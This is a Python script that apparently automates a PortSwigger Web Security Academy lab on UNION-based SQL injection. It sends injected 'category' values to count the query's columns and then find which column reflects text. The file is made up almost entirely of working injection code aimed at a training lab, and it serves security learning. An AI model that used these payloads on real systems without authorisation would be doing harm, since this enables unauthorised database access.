#!/usr/bin/env python3
import requests
import sys

# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

# API Parameters
url = 'https://abcd.web-security-academy.net/page'
params = {'category': 'Lifestyle'}
null = ["'UNION", 'SELECT', 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
response = api_session.get(url, params=sqli)

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


def sqli_union_1_lab(response):
    while not response.ok:
        null.pop(-1)
        null.extend([',', 'NULL', '--'])
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        response = api_session.get(url, params=sqli)
    print(f"There are {null.count('NULL')} columns")

    return null


def sqli_union_2_lab(response, null):
    step = null.index('NULL')
    column = 0
    while not response.ok:
        index = null.index('NULL', step)
        step = (index + 1)
        column += 1
        null[index] = "'VULNERABLE_STRING'"
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        response = api_session.get(url, params=sqli)
        null[index] = "NULL"
    print(f'Column {column} contains inserted text')


if __name__ == '__main__':

    null = sqli_union_1_lab(response=response)
    sqli_union_2_lab(response=response, null=null)
